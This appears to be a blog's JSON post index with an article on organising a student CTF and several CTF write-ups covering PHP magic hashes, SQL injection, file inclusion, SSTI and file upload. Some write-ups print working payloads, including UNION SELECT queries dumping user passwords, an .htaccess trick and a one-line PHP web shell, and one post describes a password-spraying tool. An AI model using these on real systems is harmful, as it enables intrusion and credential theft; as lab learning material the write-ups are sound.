[
  
  {
    "title": "How to create a CTF",
    "url": "/posts/FSIIEC_CTF_experience/",
    "categories": "Articles",
    "tags": "",
    "date": "2024-09-26 00:00:00 +0200",
    





    
    "snippet": "IntroductionHey guys ! It’s been a long time since i didn’t write an article so I decided to come back with a completely different subject from what I’m used to propose on this blog.Basically I usu...",
    "content": "IntroductionHey guys ! It’s been a long time since i didn’t write an article so I decided to come back with a completely different subject from what I’m used to propose on this blog.Basically I usualy write technical articles about tools that I create or write ups of ctf challenges, but today the topic will be Creating a CTF from an admin point of view. In fact with my security club SecuritIIE we organized a CTF called FSIIEC CTF, accompanied by FSEC-SS the security club of APU. This article will be mix of advices and feedback from the organization of our CTF.Before starting, please note that this won’t be a technical article, I won’t dive deep into how we set up our infra or challenges, it will be more sort of an experience feedback and some advices that I could give to people who wanna create their own CTF with their friends/colleagues.What is a CTF ?You can skip this part if you are used to CTF haha.CTF are basically cybersecurity competitions where people can compete on many topics such as web security, cryptography, reverse engineering…Each category can have its own challenges to solve in order to gain points, yea you understand that the more you have points the more you are high ranked !This competition can be either team or solo, online or presential and with many details that admins can change regarding the rules.How to start ?Now that you know what is a CTF let’s say you wanna create one, what’s the starting point ?Okay first you should have already been involved in CTF participation as a player, thus you will be able to understand what a player expects from this competition.  It can be regarding the type of challenges, difficulty, rabbit holes, organization…  This will give you a great experience to use as an admin for your next CTF.Next you will start to plan about some key points of your CTF :  Will it be competitive or educative ? For instance ours was educative, so the challenges were easier so that beginners can also join.  Who you wanna target ? We targeted only students from 3 universities with whom we have a partnership.  How long it will last ? This point is often underestimated while it’s very important. In fact if you choose to make it longer, it means that you will haveto handle the platform during a longer time, so more awareness (and more tiredness haha), but it also means that if you have an incident you have more time to repare it. If you choose to make it shorter you will have probably less work regarding the number of the challenges to make, but it will be more intense. Our CTF was a 24 hour one, I will get into details about our CTF later in this article.Building your teamThat’s a crucial question, are you building this ctf with friends, colleagues ?In our case all the members of our security club + two students from the same school joined together for that CTF.From my experience it’s important to keep it as few as possible, too much people means harder communication, harder communication means more complex organization… Ya understand !So it’s important to maintain a balance between the number of people and the tasks assigned, so as not to spread yourself too thinly or end up with too much imbalance in the work done.Going back to our CTF, we basically had multiple persons with various skills : cryptography, reverse engineering, web… So it wasn’t hard deciding who will be in charge of what in priority. But don’t forget that one must not keep himself too focused on one category, helping others is part of the process too !Creation and testing of the challengesYOU. MUST. FOLLOW. A. PROCESS.Yes.I know that many people don’t like conforming to processes, but that’s literally what will save you time and protect you from errors !Let’s take a step back to our CTF to see how this has played out in practice :The first step was to choose a collaborative platform, GitHub was perfect for that.Secondly, set up the rules for approving and testing the challenges. How we did that ?Three stages : totest, approved, final.  The first folder contains challenges to test technically, the challenge and its solution must work.  The second contains challenges to approve globally, not only for the technical part but all the requirements regarding the difficulty, the statement…  Finally the third one contains the challenges that are ready to deploy to the infra, they are 100% good including details like flag, open port…One important rule that we’ve put in place : Every time a file is moved from one stage to another, it must be verified by someone other than the person who created the challenge, in order to avoid mistakes that a designer can’t see, and to promote collaborative understanding.That’s for the static part, but testing must also be done when the challenges are deployed. Otherwise you’ll encounter bugs that you didn’t expect. (happened to us haha)Errors that you can avoid  Always TEST your challenges, at each step.  Plan everything you’re going to do : challenge production, deployment, communication… That gives you a path to follow when you feel lost, but don’t feel too rigid about it.  If you are at the top of organization like I was, beware of not giving enough responsibility to your collaborators : you are responsible for steering the ship, but you can’t take it all on !SponsorsAn important part of your organization will be finding sponsors to finance the winners’ prizes. In our case, the sponsor was directly found: our school has a fund that enabled us to award the prizes to the ctf winners ! Presenting your project to your sponsors in a way that convinces them that it will give visibility to their brand is crucial.PromotionLastly the part that engineers hate : Promotion &amp; Marketing !Obviously, the goal is to get as many players as you can within the limits of your resources. In our case, we were open to students from 3 universities, which gave us over 200 players in the end.We had 3 directions for communication: our school’s discord server, our club discord server and linkedin. Creating posters that are adapted to each platform and easy to understand is crucial to reach the maximum number of people. Using a qr code to transfer potential players to your site is a good idea (which we have implemented).Note that we were not alone in promoting this event, as we organized it with FSEC-SS members from APU, who also helped us !The EndThat’s it guys, I hope you learned some things with this article. Feel free to tell me what could be missing, I might update it to make it more complete !"
  },
  
  {
    "title": "Challengefox - Flag4All 2023",
    "url": "/posts/Challengefox/",
    "categories": "Write-ups",
    "tags": "Web security, Php, Code audit",
    "date": "2023-10-21 00:00:00 +0200",
    





    
    "snippet": "Introduction:The “Challenge Fox” is a PHP-based web challenge that tests participants’ understanding of PHP quirks, string manipulation, and hash vulnerabilities. The challenge consists of four mai...",
    "content": "Introduction:The “Challenge Fox” is a PHP-based web challenge that tests participants’ understanding of PHP quirks, string manipulation, and hash vulnerabilities. The challenge consists of four main steps, each requiring a unique approach to solve.Step 1: Code DeobfuscationUpon first inspection, the provided PHP code is obfuscated using hexadecimal representations of characters. This makes the code unreadable and challenging to understand. &lt;?phpgoto rjJoj;l5p8t:$variable = str_replace(\"\\143\\x68\\141\\154\\154\\145\\x6e\\147\\x65\\146\\x6f\\x78\", '', $variable);goto MGxdQ;lIReG:function echec(){goto jCY0w;Dm3Uc:source();goto pj4hI;jCY0w:echo \"\\x45\\143\\x68\\x65\\143\\x2e\\x20\\74\\x62\\x72\\40\\57\\76\";goto Dm3Uc;pj4hI:exit;goto gPDe0;gPDe0:}goto lbiZM;bOncl:if ($variable === \"\\143\\x68\\141\\x6c\\154\\145\\156\\147\\145\\146\\157\\x78\") {echo \"\\x2d\\x20\\123\\x69\\40\\143\\145\\x20\\x74\\x65\\170\\164\\x65\\x20\\x61\\x70\\x70\\x61\\x72\\x61\\151\\164\\54\\x20\\x74\\165\\40\\166\\x61\\154\\x69\\x64\\x65\\40\\x6c\\x61\\x20\\160\\x72\\x65\\x6d\\151\\x65\\162\\x65\\40\\x65\\x74\\141\\x70\\x65\\41\\40\\74\\x62\\x72\\76\";if (isset($_GET[\"\\143\\150\\x61\\x6c\\154\\x65\\x6e\\147\\x65\\137\\x66\\157\\x78\"])) {echo \"\\x2d\\x20\\104\\145\\165\\x78\\151\\x65\\155\\x65\\40\\145\\x74\\141\\160\\145\\x20\\x76\\141\\154\\x69\\x64\\145\\41\\x20\\x3c\\x62\\162\\x3e\";if (hash(\"\\155\\x64\\x32\", $_GET[\"\\x76\\141\\x72\\151\\141\\x62\\x6c\\x65\\x32\"]) == \"\\60\") {echo \"\\55\\x20\\124\\x72\\x6f\\151\\163\\x69\\x65\\155\\145\\x20\\145\\164\\141\\160\\x65\\40\\166\\x61\\x6c\\151\\x64\\145\\x21\\x20\\74\\142\\x72\\x3e\";if (hash(\"\\x73\\x68\\141\\x31\", $_GET[\"\\166\\x61\\x72\\x69\\141\\x62\\154\\145\\x33\"]) == $_GET[\"\\x76\\x61\\x72\\151\\141\\142\\154\\145\\63\"]) {echo \"\\55\\40\\x4f\\153\\x61\\171\\x2c\\40\\x76\\x6f\\151\\x63\\151\\40\\154\\145\\x20\\146\\154\\x61\\147\\40\\x3a\\x20\" . $secretflag . \"\\74\\142\\x72\\x3e\";}}}}goto nKESF;HVY3V:echo \"\\74\\x70\\x3e\\x41\\x6e\\x61\\x6c\\171\\x73\\x65\\x72\\x20\\154\\x65\\x20\\143\\157\\x64\\145\\40\\143\\151\\40\\x64\\x65\\x73\\x73\\x6f\\x75\\163\\x20\\145\\x74\\x20\\x74\\x72\\157\\165\\166\\145\\x72\\x20\\x6c\\145\\40\\x6d\\x6f\\x79\\x65\\x6e\\40\\x64\\40\\x61\\x66\\x66\\x69\\x63\\x68\\x65\\x72\\x20\\x6c\\x65\\x20\\x66\\154\\141\\x67\\x2e\\74\\160\\76\";goto g9hQi;lbiZM:$variable = $_GET[\"\\166\\141\\x72\\x69\\141\\142\\154\\145\"];goto l5p8t;Oz2JG:echo \"\\x3c\\164\\151\\x74\\154\\145\\76\\x43\\x68\\x61\\154\\154\\145\\156\\147\\x65\\40\\x46\\157\\x78\\x3c\\x2f\\164\\151\\x74\\154\\x65\\76\";goto E0h5E;MGxdQ:$query = urldecode($_SERVER[\"\\x51\\x55\\x45\\122\\x59\\x5f\\123\\x54\\122\\x49\\x4e\\x47\"]);goto Z_G58;MYfqC:function source(){goto nUBkJ;pqZ02:highlight_string(file_get_contents(__FILE__));goto P9KZ3;nUBkJ:echo \"\\x3c\\x62\\162\\76\\x3c\\143\\x6f\\144\\145\\76\";goto pqZ02;P9KZ3:echo \"\\74\\x2f\\x63\\157\\144\\145\\76\";goto NTzIV;NTzIV:}goto lIReG;E0h5E:echo \"\\74\\x62\\x3e\\x43\\150\\x61\\154\\154\\x65\\x6e\\x67\\x65\\40\\106\\157\\x78\\74\\x2f\\x62\\76\";goto HVY3V;Z_G58:if (preg_match(\"\\x2f\\x20\\174\\137\\x2f\", $query)) {echec();}goto bOncl;g9hQi:echo \"\\74\\142\\x72\\76\\x3c\\110\\x52\\76\\x3c\\142\\162\\76\";goto MYfqC;rjJoj:include \"\\146\\x6c\\x61\\147\\x2e\\160\\150\\x70\";goto Oz2JG;nKESF:source(); Solution: One could use various online tools or scripts to convert these hexadecimal values back to their ASCII counterparts.This gives us the following code :&lt;?phpgoto start;step1:$variable = str_replace(\"challengefox\", '', $variable);goto step2;echec:function echec(){    echo \"Echec. &lt;br /&gt;\";    source();    exit;}step2:$variable = $_GET[\"variable\"];step3:$query = urldecode($_SERVER[\"QUERY_STRING\"]);if (preg_match(\"/ |_/\", $query)) {    echec();}if ($variable === \"challengefox\") {    echo \"- Si ce texte apparait, tu valides la premiere etape! &lt;br /&gt;\";    if (isset($_GET[\"challenge_fox\"])) {        echo \"- Deuxieme etape valide! &lt;br /&gt;\";        if (hash(\"md2\", $_GET[\"variable2\"]) == \"0\") {            echo \"- Troisieme etape valide! &lt;br /&gt;\";            if (hash(\"sha1\", $_GET[\"variable3\"]) == $_GET[\"variable3\"]) {                echo \"- Okay, voici le flag : \" . $secretflag . \"&lt;br /&gt;\";            }        }    }}source();function source(){    echo \"&lt;br /&gt;&lt;code&gt;\";    highlight_string(file_get_contents(__FILE__));    echo \"&lt;/code&gt;\";}start:include \"flag.php\";echo \"&lt;title&gt;Challenge Fox&lt;/title&gt;\";echo \"&lt;b&gt;Challenge Fox&lt;/b&gt;\";echo \"&lt;p&gt;Analyser le code ci dessous et trouver le moyen d afficher le flag.&lt;p&gt;\";echo \"&lt;br /&gt;&lt;HR&gt;&lt;br /&gt;\";Step 2: Bypassing the First CheckThe first check requires the $variable to be equal to “challengefox”. However, there’s a twist. The code uses str_replace to remove the string “challengefox” from the $variable.Solution: To bypass this, we can introduce the string “chachallengefoxllengefox” in the $variable. This way, after the removal of the first occurrence, the second one remains intact. The parameter to be passed is: variable=chachallengefoxllengefox.Step 3: Bypassing the Underscore FilterFor the second step, the challenge is to set the challenge_fox parameter without using an underscore, as it’s filtered out.Solution: PHP interprets dots in GET parameter names as underscores. Thus, by setting the parameter as challenge.fox, it’s internally interpreted as challenge_fox.Step 4 &amp; 5: Exploiting Magic HashesThe third and fourth steps involve comparing hashes. PHP has a known quirk with certain hash values, known as “magic hashes”. When using loose comparison (==), these hashes can be interpreted as other values.Solution:      For the third step, we need a string whose md2 hash is equal to “0” when using loose comparison. The value variable2=2HlFqrdIKK6z produces an md2 hash that, when compared loosely in PHP, is equal to “0”.        For the fourth step, we exploit the sha1 hash. The value variable3=0e00000000000000000000081614617300000000 produces a sha1 hash that, when compared loosely, is equal to itself. This is because any string of the form 0eX where X is all numbers is considered as 0 in scientific notation in PHP.  FinalFinally we get the flag : ESD{ChallengeFox486217935}"
  },
  
  {
    "title": "Coffee Shop - PatriotCTF 2023",
    "url": "/posts/Patchwork_PatriotCTF_2023/",
    "categories": "Write-ups",
    "tags": "Reverse engineering",
    "date": "2023-09-09 00:00:00 +0200",
    





    
    "snippet": "ChallengeHere’s a write-up for a reverse challenge.The challenge description :ExploitationWe open the file with gdb and then disassemble the main function which is often the most interesting functi...",
    "content": "ChallengeHere’s a write-up for a reverse challenge.The challenge description :ExploitationWe open the file with gdb and then disassemble the main function which is often the most interesting function in reverse challenges.gdb ./patchwork(gdb) disas mainDump of assembler code for function main:   0x0000000000001139 &lt;+0&gt;:     push   %rbp   0x000000000000113a &lt;+1&gt;:     mov    %rsp,%rbp   0x000000000000113d &lt;+4&gt;:     sub    $0x10,%rsp   0x0000000000001141 &lt;+8&gt;:     movl   $0x0,-0x4(%rbp)   0x0000000000001148 &lt;+15&gt;:    lea    0xeb9(%rip),%rax        # 0x2008   0x000000000000114f &lt;+22&gt;:    mov    %rax,%rdi   0x0000000000001152 &lt;+25&gt;:    call   0x1030 &lt;puts@plt&gt;   0x0000000000001157 &lt;+30&gt;:    lea    0xeda(%rip),%rax        # 0x2038   0x000000000000115e &lt;+37&gt;:    mov    %rax,%rdi   0x0000000000001161 &lt;+40&gt;:    call   0x1030 &lt;puts@plt&gt;   0x0000000000001166 &lt;+45&gt;:    cmpl   $0x0,-0x4(%rbp)   0x000000000000116a &lt;+49&gt;:    je     0x1176 &lt;main+61&gt;   0x000000000000116c &lt;+51&gt;:    mov    $0x0,%eax   0x0000000000001171 &lt;+56&gt;:    call   0x117d &lt;give_flag&gt;   0x0000000000001176 &lt;+61&gt;:    mov    $0x0,%eax   0x000000000000117b &lt;+66&gt;:    leave   0x000000000000117c &lt;+67&gt;:    retEnd of assembler dump.We clearly see that the goal here is to bypass the jump following the comparison.So we use the break command to stop the execution of the program at the jump instruction : (gdb) break *0x000055555555516a.And then we replace je by jne so that our comparison will be correct (jne means jump if not equal):set {unsigned char}0x000055555555516a = 0x75What we have typed set the opcode of jne which is 0x75 instead of the one of je instruction.And we finish the execution !(gdb) nextSingle stepping until exit from function main,which has no line number information.PCTF{JuMp_uP_4nd_g3t_d0Wn}Flagged !"
  },
  
  {
    "title": "Discovering public passwords in Active Directory",
    "url": "/posts/Crumby/",
    "categories": "Articles",
    "tags": "Active Directory",
    "date": "2023-08-03 00:00:00 +0200",
    





    
    "snippet": "Okay, so the story that motivated me for this article was that I found some password in public text fields during a pentest on a Active directory lab during my cybersecurity internship.I decided to...",
    "content": "Okay, so the story that motivated me for this article was that I found some password in public text fields during a pentest on a Active directory lab during my cybersecurity internship.I decided to automate this task because I didn’t find any tool to do it. (feel free to tell me if it exists already)Passwords In DisguiseSo, this situation is pretty rare, but it can happen that forgetful administrators might have saved passwords in plaintext in AD public text fields, specifically in the description fields. This may be because they wanted it back quickly after a short period, or because they simply forgot about it.Introducing the Crumbs Finder: CrumbyBut what if we could automate this search? Sounds good, right? Enter Crumby, a simple tool that I’ve been fiddling with. Crumby, in a nutshell, scans through the AD environment, hunting down those rogue plaintext passwords and even sprays them against all user accounts for possible matches.Now, before you start testing it, let me assure you that’s not a game changer at all ! Perhaps it exists and it’s as straightforward as it gets. But hey, even the simplest of tools can be potent when used right !Using CrumbyAll the details can be found in the github repo : CrumbyEnjoy 👋"
  },
  
  {
    "title": "FCSC 2023 - Enisa flag store 1",
    "url": "/posts/FCSC_Enisa_flag_store_1/",
    "categories": "Write-ups",
    "tags": "Web security, SQL Injection",
    "date": "2023-04-30 00:00:00 +0200",
    





    
    "snippet": "ReconnaissanceHere’s the challenge, a .go file is given too with the link to the website :There’s a mention of a database : we directly plan to do a sqliSo we see a classic signup pagefunc getData(...",
    "content": "ReconnaissanceHere’s the challenge, a .go file is given too with the link to the website :There’s a mention of a database : we directly plan to do a sqliSo we see a classic signup pagefunc getData(user User) (    []Flag,    error,) {    var flags []Flag    req := fmt.Sprintf(`SELECT ctf, challenge, flag, points                        FROM flags WHERE country = '%s';`, user.Country);    rows, err := db.Query(req);    if err != nil {        return flags, err    }    defer rows.Close()    for rows.Next() {        var flag Flag        err = rows.Scan(&amp;flag.CTF, &amp;flag.Challenge, &amp;flag.Flag, &amp;flag.Points)        if err != nil {            return flags, err        }        flags = append(flags, flag)    }    if err = rows.Err(); err != nil {        return flags, err    }    return flags, nil}Returning back to the code, we have to analyze it. All the sql requests in the .go file are prepared, except one in the getData function… Does that mean that we could exploit it ? 👀By analyzing the code, we understand that getData is called in show_flags, which is called itself when we go to the /flags section in the website. So the plan is to inject what we want in the country field, which can be modified only once : during the signup !ExploitationThe problem is that we’re forced to select a country, so we can’t inject our payload. But using BurpSuite, it is possible !Then we go to /flags, and we see the flag appearing at the top ! (if i didn’t inject the payload it would print only the french flags related to my token and not this one)"
  },
  
  {
    "title": "ZITF2023 - Zira's lab 1",
    "url": "/posts/ZITF2023_Ziras_lab1/",
    "categories": "Write-ups",
    "tags": "Web security, File inclusion",
    "date": "2023-03-18 00:00:00 +0100",
    





    
    "snippet": "ReconnaissanceHere we are in the zira’s lab. We guess that there’s a use of the include fonction in php because we can go to the page that we want with the page parameter. If you’re trained to php ...",
    "content": "ReconnaissanceHere we are in the zira’s lab. We guess that there’s a use of the include fonction in php because we can go to the page that we want with the page parameter. If you’re trained to php challenges you detect that there’s a potential file inclusion !ExploitationThe exploitation part is very short because it could be made fastly with that following payload allowing us to read the login page (that we see by exploring the site) but encoded in base64The result decoded gives us the login page code (at the start of the code line 6 in the screen), with precious ids&lt;?php session_start(); /* Starts the session */        /* Check Login form submitted */        if(isset($_POST['Submit'])){                /* Define username and associated password array */                $logins = array('zira' =&gt; 'MyUnguessablePasswordNotInRockYouMWAHAHAHA');                /* Check and assign submitted Username and Password to new variable */                $Username = isset($_POST['Username']) ? $_POST['Username'] : '';                $Password = isset($_POST['Password']) ? $_POST['Password'] : '';                /* Check Username and Password existence in defined array */                if (isset($logins[$Username]) &amp;&amp; $logins[$Username] == $Password){                        /* Success: Set session variables and redirect to Protected page  */                        $_SESSION['UserData']['Username']=$logins[$Username];                        header(\"location:protect.php\");                        exit;                } else {                        /*Unsuccessful attempt: Set error message */                        $msg=\"&lt;span style='color:red'&gt;Invalid Login Details&lt;/span&gt;\";                }        }include('html/login.html');?&gt;We connect with zira and MyUnguessablePasswordNotInRockYouMWAHAHAHA on login.php and we have access to protect.php which displays the flag !"
  },
  
  {
    "title": "ZITF2023 - Website Renderer 1",
    "url": "/posts/ZITF2023_Website_renderer_1/",
    "categories": "Write-ups",
    "tags": "Web security, Server-Side template injection",
    "date": "2023-03-18 00:00:00 +0100",
    





    
    "snippet": "ReconnaissanceWe clearly recognize that there’s a potential SSTI (Server-Side template injection) in this challenge. The idea for beginning the exploiting part is to run a basic payload to see what...",
    "content": "ReconnaissanceWe clearly recognize that there’s a potential SSTI (Server-Side template injection) in this challenge. The idea for beginning the exploiting part is to run a basic payload to see what it gives:# ExploitationSo we see that the {7*7} is well interpretedWe can continue with a random payload to learn more about the template engine, by triggering an error :We get an error that tells us the name of the engine: Genshi, I didn’t use this info but it may be useful in other ways of exploitation or challenges.Let’s go on with a classic payload to execute a bash command, it returns 0 so the command was successful (1 if execution error).But obviously we want the result of the command, not the return code, so we’ll rely on the fact that /tmp is a folder where we can very often write files in challenges. Finally we read the content of this file we have just written.Bingo, we see the list of files, the next part comes logically…We’ll just go to “flag” (after testing that it was a folder), then read flag.txt. These two operations are also based on files in /tmp.Flagged !Github repo"
  },
  
  {
    "title": "ZITF2023 - MovieDB",
    "url": "/posts/ZITF2023_MovieDB/",
    "categories": "Write-ups",
    "tags": "Web security, SQL Injection",
    "date": "2023-03-18 00:00:00 +0100",
    





    
    "snippet": "ReconnaissanceThis challenge offers us a movie site with a search bar, we immediately guess that there is surely a possibility of sql injection.ExploitationThe first thing we see that seems interes...",
    "content": "ReconnaissanceThis challenge offers us a movie site with a search bar, we immediately guess that there is surely a possibility of sql injection.ExploitationThe first thing we see that seems interesting to exploit is the search bar. Let’stry a classic sql injection that will surely cause an error due to its large number.Now we have a precious information, the DBMS is sqlite3, we can adapt ourinjections to it. Let’s try a more serious injection :'union select name,sql,null,null,null,null from sqlite_master where type='table' --; I put some null values in the injection for testing by adding a null until itdoesn’t print the error ”SELECTs to the left and right of UNION do not havethe same number of result columns”. The goal was to have the same numberof columns with the select executed in the site for searching movies.The trick here was to pay attention to the source code because someinteresting sql code (create table …) was there, we get the names of thecolumns and we’ll simply do a final injection to get the data that we wantfrom users, result in the next page :'union select username,password,null,null,null,null from users --`Flagged ! ZiTF{eLcVAVdDEfNmLjLEWGqF} in the source codeGithub repo"
  },
  
  {
    "title": "ZITF2023 - The gallery",
    "url": "/posts/ZITF2023_the_gallery/",
    "categories": "Write-ups",
    "tags": "Web security, File upload",
    "date": "2023-03-18 00:00:00 +0100",
    





    
    "snippet": "ReconnaissanceWith this challenge we immediately guess that there’s a file upload vulnerabilityAfter uploading an image, we see it in uploads/ExploitationFirst we’ll upload an .htaccess that will a...",
    "content": "ReconnaissanceWith this challenge we immediately guess that there’s a file upload vulnerabilityAfter uploading an image, we see it in uploads/ExploitationFirst we’ll upload an .htaccess that will allow us to upload jpg files but interpreted as php. The trick here is to inject some php code in the jpg file, we can use burpsuite for it.The .htaccess file contains AddType application/x-httpd-php .jpg.We can then upload an image with the following code giving us a web shell:&lt;?php if(isset($_GET[\"cmd\"])) system($_GET[\"cmd\"]); ?&gt;Let’s gooo our getshell works we can use the command we want, starting with a classic ls and some others commands until we reach the flag by exploring.Flagged !Github repo"
  }
  
]

